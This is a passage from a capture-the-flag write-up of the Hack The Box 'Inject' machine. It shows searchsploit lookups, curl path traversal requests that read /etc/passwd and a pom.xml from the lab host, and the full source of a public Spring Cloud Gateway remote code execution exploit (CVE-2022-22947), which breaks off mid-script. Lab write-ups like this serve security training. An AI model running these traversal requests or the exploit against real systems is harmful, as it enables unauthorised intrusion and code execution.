</span></span><span class=line><span class=cl>Nagios3 - <span class=s1>&#39;history.cgi&#39;</span> Remote Command Execution                                           <span class=p>|</span> multiple/remote/24084.py
</span></span><span class=line><span class=cl>Nagios3 - <span class=s1>&#39;statuswml.cgi&#39;</span> <span class=s1>&#39;Ping&#39;</span> Command Execution <span class=o>(</span>Metasploit<span class=o>)</span>                            <span class=p>|</span> cgi/webapps/16908.rb
</span></span><span class=line><span class=cl>Nagios3 - <span class=s1>&#39;statuswml.cgi&#39;</span> Command Injection <span class=o>(</span>Metasploit<span class=o>)</span>                                   <span class=p>|</span> unix/webapps/9861.rb
</span></span><span class=line><span class=cl>NagiosQL <span class=m>2005</span> 2.00 - <span class=s1>&#39;prepend_adm.php&#39;</span> Remote File Inclusion                               <span class=p>|</span> php/webapps/3919.txt
</span></span><span class=line><span class=cl>PHPNagios 1.2.0 - <span class=s1>&#39;menu.php&#39;</span> Local File Inclusion                                          <span class=p>|</span> php/webapps/9611.txt
</span></span><span class=line><span class=cl>------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Shellcodes: No Results
</span></span></code></pre></div><p>Nothing proved useful here.</p><h3 id=burpsuite>burpsuite<a hidden class=anchor aria-hidden=true href=#burpsuite>#</a></h3><p>I then started using <code>burpsuite</code> to see if anything weird was happening with the requests. Eventually, I realized that the query string (or URL parameter) was passing in the desired file. But can we specify any file? Seemed like a <code>path traversal</code> vulnerability could be present.</p><h3 id=curl>curl<a hidden class=anchor aria-hidden=true href=#curl>#</a></h3><p>I then switched over to <code>curl</code> so I could perform this path injection from my terminal. First, I tested to see what would happen with my PHP reverse shell &ldquo;image.&rdquo;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/inject<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ curl <span class=s2>&#34;http://10.10.11.204:8080/show_image?img=shell.png&#34;</span>
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;timestamp&#34;</span>:<span class=s2>&#34;2023-03-21T03:37:17.652+00:00&#34;</span>,<span class=s2>&#34;status&#34;</span>:500,<span class=s2>&#34;error&#34;</span>:<span class=s2>&#34;Internal Server Error&#34;</span>,<span class=s2>&#34;message&#34;</span>:<span class=s2>&#34;URL [file:/var/www/WebApp/src/main/uploads/shell.png] cannot be resolved in the file system for checking its content length&#34;</span>,<span class=s2>&#34;path&#34;</span>:<span class=s2>&#34;/show_image&#34;</span><span class=o>}</span>  
</span></span></code></pre></div><p>Right away, we can see the path to this file is output. Now let&rsquo;s try with something a little more spicy.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/inject<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ curl <span class=s2>&#34;http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd&#34;</span>                                             
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span class=line><span class=cl>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span class=line><span class=cl>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
</span></span><span class=line><span class=cl>pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span class=line><span class=cl>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span class=line><span class=cl>frank:x:1000:1000:frank:/home/frank:/bin/bash
</span></span><span class=line><span class=cl>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span class=line><span class=cl>sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>phil:x:1001:1001::/home/phil:/bin/bash
</span></span><span class=line><span class=cl>fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>_laurel:x:997:996::/var/log/laurel:/bin/false
</span></span></code></pre></div><p>Some digging later, I found this interesting configuration file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>curl <span class=s2>&#34;http://10.10.11.204:8080/show_image?img=../../../../../www/WebApp/pom.xml&#34;</span> &gt; pom.xml
</span></span></code></pre></div><p><em>file: pom.xml</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;project</span> <span class=na>xmlns=</span><span class=s>&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class=line><span class=cl> <span class=na>xsi:schemaLocation=</span><span class=s>&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;modelVersion&gt;</span>4.0.0<span class=nt>&lt;/modelVersion&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;parent&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;groupId&gt;</span>org.springframework.boot<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;artifactId&gt;</span>spring-boot-starter-parent<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;version&gt;</span>2.6.5<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;relativePath/&gt;</span> <span class=c>&lt;!-- lookup parent from repository --&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;/parent&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;groupId&gt;</span>com.example<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;artifactId&gt;</span>WebApp<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;version&gt;</span>0.0.1-SNAPSHOT<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;name&gt;</span>WebApp<span class=nt>&lt;/name&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;description&gt;</span>Demo project for Spring Boot<span class=nt>&lt;/description&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;properties&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;java.version&gt;</span>11<span class=nt>&lt;/java.version&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;/properties&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;dependencies&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>     <span class=nt>&lt;groupId&gt;</span>com.sun.activation<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>     <span class=nt>&lt;artifactId&gt;</span>javax.activation<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>     <span class=nt>&lt;version&gt;</span>1.2.0<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;groupId&gt;</span>org.springframework.boot<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;artifactId&gt;</span>spring-boot-starter-thymeleaf<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;groupId&gt;</span>org.springframework.boot<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;artifactId&gt;</span>spring-boot-starter-web<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;groupId&gt;</span>org.springframework.boot<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;artifactId&gt;</span>spring-boot-devtools<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;scope&gt;</span>runtime<span class=nt>&lt;/scope&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;optional&gt;</span>true<span class=nt>&lt;/optional&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;groupId&gt;</span>org.springframework.cloud<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;artifactId&gt;</span>spring-cloud-function-web<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;version&gt;</span>3.2.2<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;groupId&gt;</span>org.springframework.boot<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;artifactId&gt;</span>spring-boot-starter-test<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;scope&gt;</span>test<span class=nt>&lt;/scope&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;groupId&gt;</span>org.webjars<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;artifactId&gt;</span>bootstrap<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;version&gt;</span>5.1.3<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;dependency&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;groupId&gt;</span>org.webjars<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;artifactId&gt;</span>webjars-locator-core<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/dependency&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;/dependencies&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;build&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;plugins&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;plugin&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;groupId&gt;</span>org.springframework.boot<span class=nt>&lt;/groupId&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;artifactId&gt;</span>spring-boot-maven-plugin<span class=nt>&lt;/artifactId&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;version&gt;</span>${parent.version}<span class=nt>&lt;/version&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;/plugin&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/plugins&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;finalName&gt;</span>spring-webapp<span class=nt>&lt;/finalName&gt;</span>
</span></span><span class=line><span class=cl> <span class=nt>&lt;/build&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/project&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=searchsploit-1>searchsploit<a hidden class=anchor aria-hidden=true href=#searchsploit-1>#</a></h3><p>Now back to <code>searchsploit</code> to see if any of these plugins are vulnerable!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/inject<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ searchsploit <span class=s2>&#34;spring cloud&#34;</span>
</span></span><span class=line><span class=cl>------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                                             <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Spring Cloud Config 2.1.x - Path Traversal <span class=o>(</span>Metasploit<span class=o>)</span>                                    <span class=p>|</span> java/webapps/46772.rb
</span></span><span class=line><span class=cl>Spring Cloud Gateway 3.1.0 - Remote Code Execution <span class=o>(</span>RCE<span class=o>)</span>                                   <span class=p>|</span> java/webapps/50799.py
</span></span><span class=line><span class=cl>------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Shellcodes: No Results
</span></span></code></pre></div><p>Remote Code Execution (<code>RCE</code>) sounds very promising! We can learn more about the script via:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>cat /usr/share/exploitdb/exploits/java/webapps/50799.py
</span></span></code></pre></div><p>This gives us the output of:</p><p><em>file: 50799.py</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Exploit Title: Spring Cloud Gateway 3.1.0 - Remote Code Execution (RCE)</span>
</span></span><span class=line><span class=cl><span class=c1># Google Dork: N/A</span>
</span></span><span class=line><span class=cl><span class=c1># Date: 03/03/2022</span>
</span></span><span class=line><span class=cl><span class=c1># Exploit Author: Carlos E. Vieira</span>
</span></span><span class=line><span class=cl><span class=c1># Vendor Homepage: https://spring.io/</span>
</span></span><span class=line><span class=cl><span class=c1># Software Link: https://spring.io/projects/spring-cloud-gateway</span>
</span></span><span class=line><span class=cl><span class=c1># Version: This vulnerability affect Spring Cloud Gateway &lt; 3.0.7 &amp; &lt; 3.1.1</span>
</span></span><span class=line><span class=cl><span class=c1># Tested on: 3.1.0</span>
</span></span><span class=line><span class=cl><span class=c1># CVE : CVE-2022-22947</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span> <span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/json&#34;</span> <span class=p>,</span> <span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&#39;</span><span class=p>,</span><span class=s1>&#39;Accept&#39;</span> <span class=p>:</span> <span class=s1>&#39;*/*&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>proxies</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;http&#39;</span><span class=p>:</span> <span class=s1>&#39;http://172.29.32.1:8081&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;https&#39;</span><span class=p>:</span> <span class=s1>&#39;http://172.29.32.1:8081&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nb>id</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exploit</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>command</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=p>{</span> <span class=s2>&#34;id&#34;</span><span class=p>:</span> <span class=nb>id</span><span class=p>,</span> <span class=s2>&#34;filters&#34;</span><span class=p>:</span> <span class=p>[{</span> <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;AddResponseHeader&#34;</span><span class=p>,</span> <span class=s2>&#34;args&#34;</span><span class=p>:</span> <span class=p>{</span> <span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Result&#34;</span><span class=p>,</span> <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(</span><span class=se>\u0022</span><span class=s2>&#34;</span><span class=o>+</span><span class=n>command</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\u0022</span><span class=s2>).getInputSt</span>
</span></span><span class=line><span class=cl><span class=n>ream</span><span class=p>()))}</span><span class=s2>&#34;}}],&#34;</span><span class=n>uri</span><span class=s2>&#34;: &#34;</span><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>example</span><span class=o>.</span><span class=n>com</span><span class=s2>&#34;}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>commandb64</span> <span class=o>=</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>command</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rbase</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/actuator/gateway/routes/&#39;</span><span class=o>+</span><span class=nb>id</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>rbase</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>201</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Stage deployed to /actuator/gateway/routes/&#34;</span><span class=o>+</span><span class=nb>id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Executing command...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/actuator/gateway/refresh&#39;</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] getting result...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/actuator/gateway/routes/&#39;</span> <span class=o>+</span> <span class=nb>id</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>get_response</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=n>clean</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=nb>id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>get_response</span><span class=p>[</span><span class=s1>&#39;filters&#39;</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;&#39;&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Error: Invalid response&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>clean</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=nb>id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>clean</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=nb>id</span><span class=p>)</span>
